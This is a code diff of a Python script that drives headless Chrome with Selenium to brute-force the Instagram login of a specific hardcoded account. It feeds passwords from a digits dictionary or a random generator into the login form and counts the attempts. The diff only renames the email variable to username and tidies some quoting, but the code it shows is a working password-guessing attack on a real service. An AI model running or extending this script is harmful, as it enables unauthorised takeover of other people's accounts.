@@ -34,13 +34,12 @@ def main():
       argv.append(printable)
    charset = get_charset(argv[1])
    password_len = int(8)
-   email = str("_matte.02_")  # or USERNAME
+   username = str("_matte.02_")  # or email
    url = str("https://www.instagram.com/")
-   password = str("")
    attempts = int(0)
    chrome_options = Options()
    chrome_options.add_argument("--headless")
-   chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
+   chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver = None
    passwords_file = open("./password_dictionary/digits.txt", "r") if argv[1] == "digits" else None
    start_time = time()
@@ -58,10 +57,10 @@ def main():
          exit(0)
       password = passwords_file.readline().strip() if argv[1] == "digits" else passwords_faker(charset, password_len)
       attempts += 1
-      print(f"\nAttempt number {attempts}: {(email, password)}")
+      print(f"\nAttempt number {attempts}: {(username, password)}")
       try:
          sleep(1.3)
-         driver.find_element("name", "username").send_keys(email)
+         driver.find_element("name", "username").send_keys(username)
          sleep(0.4)
          driver.find_element("name", "password").send_keys(password)
          sleep(0.4)
